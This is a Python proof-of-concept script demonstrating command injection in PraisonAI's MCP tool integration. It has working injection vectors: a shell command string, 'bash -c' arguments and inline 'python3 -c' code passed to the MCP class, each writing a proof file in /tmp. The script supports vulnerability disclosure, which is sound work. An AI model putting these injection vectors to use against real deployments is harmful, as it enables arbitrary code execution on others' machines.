#!/usr/bin/env python3
"""
🚨 PraisonAI MCP Command Injection Vulnerability PoC
This script demonstrates the command injection vulnerability in PraisonAI's MCP integration

⚠️  Warning: This script is for security research and vulnerability demonstration purposes only!
"""

import sys
import os
import tempfile
import asyncio
from pathlib import Path

# Add the PraisonAI source path to import modules
current_dir = Path(__file__).parent
praisonai_src = current_dir / "src" / "praisonai-agents"
sys.path.insert(0, str(praisonai_src))

try:
    from praisonaiagents import Agent, MCP
    from praisonaiagents.mcp.mcp import MCP as MCPClass
except ImportError as e:
    print(f"❌ Failed to import PraisonAI modules: {e}")
    print("Please ensure you're running this from the PraisonAI root directory")
    sys.exit(1)

def test_command_injection_vector_1():
    """
    Test Vector 1: Direct command injection through MCP string constructor
    This exploits the shlex.split() parsing in mcp.py line 270-288
    """
    print("🚨 [Test Vector 1] Direct command injection through MCP string constructor")
    
    # Create a proof file to demonstrate command execution
    proof_file = "/tmp/praisonai_command_injection_proof_1.txt"
    
    try:
        # Malicious command that creates a proof file
        malicious_command = f"touch {proof_file} && echo 'Command injection successful via Vector 1' > {proof_file}"
        
        print(f"   Attempting to execute: {malicious_command}")
        
        # This will trigger the vulnerability in mcp.py line 311-315
        # The command string is parsed by shlex.split() and passed directly to StdioServerParameters
        try:
            agent = Agent(
                instructions="You are a helpful assistant",
                llm="gpt-4o-mini",  # This won't actually be called
                tools=MCP(malicious_command)
            )
            print("   ✅ MCP object created successfully")
        except Exception as e:
            print(f"   ⚠️  MCP creation failed (expected): {e}")
            # Even if MCP creation fails, the command might still execute
        
        # Check if the proof file was created
        if os.path.exists(proof_file):
            with open(proof_file, 'r') as f:
                content = f.read().strip()
            print(f"   ✅ VULNERABILITY CONFIRMED: {content}")
            os.remove(proof_file)  # Clean up
            return True
        else:
            print("   ❌ Command injection failed or not executed")
            return False
            
    except Exception as e:
        print(f"   ❌ Test failed with exception: {e}")
        return False

def test_command_injection_vector_2():
    """
    Test Vector 2: Command injection through separate command and args
    This exploits the direct parameter passing in mcp.py line 286-288
    """
    print("🚨 [Test Vector 2] Command injection through separate command and args")
    
    proof_file = "/tmp/praisonai_command_injection_proof_2.txt"
    
    try:
        print(f"   Attempting to execute: bash -c 'echo Vector2 > {proof_file}'")
        
        # This exploits the vulnerability where cmd and arguments are passed directly
        # to StdioServerParameters without validation
        try:
            agent = Agent(
                instructions="Assistant with tools",
                llm="gpt-4o-mini",
                tools=MCP(
                    command="bash",
                    args=["-c", f"echo 'Command injection successful via Vector 2' > {proof_file}"]
                )
            )
            print("   ✅ MCP object created successfully")
        except Exception as e:
            print(f"   ⚠️  MCP creation failed (expected): {e}")
        
        # Check if the proof file was created
        if os.path.exists(proof_file):
            with open(proof_file, 'r') as f:
                content = f.read().strip()
            print(f"   ✅ VULNERABILITY CONFIRMED: {content}")
            os.remove(proof_file)  # Clean up
            return True
        else:
            print("   ❌ Command injection failed or not executed")
            return False
            
    except Exception as e:
        print(f"   ❌ Test failed with exception: {e}")
        return False

def test_command_injection_vector_3():
    """
    Test Vector 3: Python code injection through args
    This demonstrates arbitrary Python code execution
    """
    print("🚨 [Test Vector 3] Python code injection through args")
    
    proof_file = "/tmp/praisonai_command_injection_proof_3.txt"
    
    try:
        # Malicious Python code
        malicious_python = f"""
import os
with open('{proof_file}', 'w') as f:
    f.write('Command injection successful via Vector 3 - Python code execution')
    f.write(f'\\nCurrent user: {{os.getenv("USER", "unknown")}}')
    f.write(f'\\nCurrent directory: {{os.getcwd()}}')
"""
        
        print(f"   Attempting to execute Python code injection")
        
        try:
            agent = Agent(
                instructions="Assistant",
                llm="gpt-4o-mini",
                tools=MCP(
                    command="python3",
                    args=["-c", malicious_python]
                )
            )
            print("   ✅ MCP object created successfully")
        except Exception as e:
            print(f"   ⚠️  MCP creation failed (expected): {e}")
        
        # Check if the proof file was created
        if os.path.exists(proof_file):
            with open(proof_file, 'r') as f:
                content = f.read().strip()
            print(f"   ✅ VULNERABILITY CONFIRMED:")
            for line in content.split('\n'):
                print(f"      {line}")
            os.remove(proof_file)  # Clean up
            return True
        else:
            print("   ❌ Command injection failed or not executed")
            return False
            
    except Exception as e:
        print(f"   ❌ Test failed with exception: {e}")
        return False

def test_npx_wrapper_vulnerability():
    """
    Test Vector 4: NPX wrapper vulnerability
    This tests the vulnerability in npx_mcp_wrapper_main.py
    """
    print("🚨 [Test Vector 4] NPX wrapper vulnerability test")
    
    try:
        # Try to import the NPX wrapper
        npx_wrapper_path = praisonai_src / "tests" / "npx_mcp_wrapper_main.py"
        if npx_wrapper_path.exists():
            print("   ✅ NPX wrapper found - vulnerability exists in extract_tools and call_tool functions")
            print("   📍 Vulnerable locations:")
            print("      - Line 77-82: extract_tools function")
            print("      - Line 177-182: call_tool function")
            print("   ⚠️  These functions directly pass user input to StdioServerParameters")
            return True
        else:
            print("   ❌ NPX wrapper not found")
            return False
    except Exception as e:
        print(f"   ❌ Test failed: {e}")
        return False

def main():
    """
    Main function to run all vulnerability tests
    """
    print("🚨 PraisonAI MCP Command Injection Vulnerability PoC")
    print("=" * 60)
    print("⚠️  WARNING: This is for security research purposes only!")
    print("📍 Testing vulnerabilities in PraisonAI MCP integration")
    print()
    
    # Track successful exploits
    successful_vectors = []
    
    # Test all vectors
    if test_command_injection_vector_1():
        successful_vectors.append("Vector 1: String command injection")
    
    print()
    if test_command_injection_vector_2():
        successful_vectors.append("Vector 2: Separate command/args injection")
    
    print()
    if test_command_injection_vector_3():
        successful_vectors.append("Vector 3: Python code injection")
    
    print()
    if test_npx_wrapper_vulnerability():
        successful_vectors.append("Vector 4: NPX wrapper vulnerability")
    
    print()
    print("=" * 60)
    print("🚨 VULNERABILITY ASSESSMENT RESULTS:")
    
    if successful_vectors:
        print(f"   ✅ {len(successful_vectors)} vulnerability vector(s) confirmed:")
        for vector in successful_vectors:
            print(f"      • {vector}")
        print()
        print("🚨 CRITICAL: PraisonAI is vulnerable to command injection attacks!")
        print("   Attackers can execute arbitrary commands through MCP tool configuration")
        print("   This affects all components that use the MCP class or related wrappers")
    else:
        print("   ✅ No vulnerabilities successfully exploited in this test")
        print("   (This may be due to environment constraints, not absence of vulnerability)")
    
    print()
    print("📍 Vulnerable code locations identified:")
    print("   • src/praisonai-agents/praisonaiagents/mcp/mcp.py:311-315")
    print("   • src/praisonai-agents/praisonaiagents/mcp/mcp.py:270-288") 
    print("   • src/praisonai-agents/tests/npx_mcp_wrapper_main.py:77-82")
    print("   • src/praisonai-agents/tests/npx_mcp_wrapper_main.py:177-182")
    print("   • src/praisonai-agents/tests/mcp_wrapper.py:61-65")

if __name__ == "__main__":
    main()
